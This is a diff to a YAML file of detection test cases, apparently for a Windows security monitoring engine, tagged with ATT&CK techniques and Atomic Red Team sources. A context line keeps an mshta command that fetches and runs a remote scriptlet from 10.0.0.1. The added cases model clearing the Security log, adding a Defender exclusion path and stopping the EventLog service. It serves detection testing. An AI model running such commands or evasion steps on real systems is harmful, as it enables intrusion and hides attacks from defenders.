@@ -61,6 +61,18 @@ cases:
           path: "C:\\Windows\\System32\\mshta.exe"
         cmd_line: 'mshta.exe javascript:a=GetObject("script:http://10.0.0.1/a.sct").Exec();close();'
 
+  - name: wevtutil 清空 Security 日志（1102 日志清空事件）
+    technique: T1070.001
+    source: atomic T1070.001
+    class: 3002
+    os: windows
+    event:
+      activity_id: 13
+      status_id: 1
+      user:
+        name: attacker
+      log_cleared: true
+
   - name: 删除 Run 键自启动值（擦痕迹，快照 diff 删除事件带旧值）
     technique: T1070
     source: atomic T1547.001 反向操作
@@ -115,3 +127,27 @@ cases:
       activity_id: 4
       file:
         path: "C:\\Users\\user\\Downloads\\old-build.zip"
+
+  - name: 新增 Defender 排除路径（快照 diff 注册表事件）
+    technique: T1562.001
+    source: atomic T1562.001
+    class: 201002
+    os: windows
+    event:
+      activity_id: 1
+      reg_key:
+        path: "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\Public"
+      reg_value:
+        data: "0"
+
+  - name: 停止 EventLog 服务瞎眼（服务快照 State 翻转）
+    technique: T1562.001
+    source: atomic T1562.001
+    class: 201002
+    os: windows
+    event:
+      activity_id: 3
+      reg_key:
+        path: "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog"
+      reg_value:
+        data: "ImagePath=C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted; Start=2; State=Stopped"
